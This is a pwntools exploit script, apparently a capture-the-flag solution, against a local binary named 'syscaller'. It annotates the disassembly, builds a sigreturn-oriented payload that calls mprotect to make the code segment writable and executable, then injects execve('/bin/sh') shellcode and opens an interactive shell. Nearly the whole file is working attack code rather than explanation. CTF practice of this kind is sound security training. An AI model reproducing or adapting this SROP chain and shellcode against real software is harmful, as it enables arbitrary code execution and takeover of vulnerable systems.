from pwn import * 


p=process("./syscaller")


'''
        _start                                          XREF[3]:     Entry Point(*), 00400018(*), 
        004000e0 55              PUSH       RBP
        004000e1 48 89 e5        MOV        RBP,RSP
        004000e4 48 81 ec        SUB        RSP,512
                 00 02 00 00
        004000eb bf 01 00        MOV        EDI,0x1
                 00 00
        004000f0 48 be 30        MOV        RSI,msg1                                         = align(1)
                 01 40 00 
                 00 00 00 00
        004000fa ba 3e 00        MOV        EDX,62
                 00 00
        004000ff b8 01 00        MOV        EAX,0x1
                 00 00
        00400104 0f 05           SYSCALL
        00400106 b8 00 00        MOV        EAX,0x0
                 00 00
        0040010b 48 89 e6        MOV        RSI,RSP                              RSP - location of my input
        0040010e bf 00 00        MOV        EDI,0x0
                 00 00
        00400113 ba 00 02        MOV        EDX,0x200
                 00 00
        00400118 0f 05           SYSCALL                                        read(0,buff,0x200)

        0040011a 41 5c           POP        R12
        0040011c 41 5b           POP        R11
        0040011e 5f              POP        RDI
        0040011f 58              POP        RAX
        00400120 5b              POP        RBX
        00400121 5a              POP        RDX
        00400122 5e              POP        RSI
        00400123 5f              POP        RDI
        00400124 0f 05           SYSCALL
        00400126 b8 3c 00        MOV        EAX,60
                 00 00
        0040012b 48 31 ff        XOR        RDI,RDI
        0040012e 0f 05           SYSCALL                                                     
'''
#call sigreturn
junk= '0' * 8
r12 = junk
r11 = junk
rdi = junk
rax = p64(0xf)      #15
rbx = junk
rdx =	junk
rsi = junk	
rdi = junk

payload = ''
payload += r12 + r11 + rdi + rax + rbx + rdx + rsi + rdi

#construct sigreturn to call mprotect to permite rwx in 0x400000-0x401000
frame = SigreturnFrame(arch="amd64") 
frame.rax = 0xa							          #rax to mprotect syscall
frame.rdi = 0x400000				          #addr to change
frame.rsi = 0x1000					          #len 
frame.rdx = 0x7 						          #permissions - rwx
frame.rsp = 0x40011a                  #locate rsp to gadgets pop_r12,pop_r11
frame.rip = 0x400104                  #: syscall; 


payload += str(frame)

p.recvuntil("Hello and welcome to the Labyrinthe. Make your way or perish.\n")
p.sendline(payload)
#http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
p.sendline(shellcode)
p.interactive()
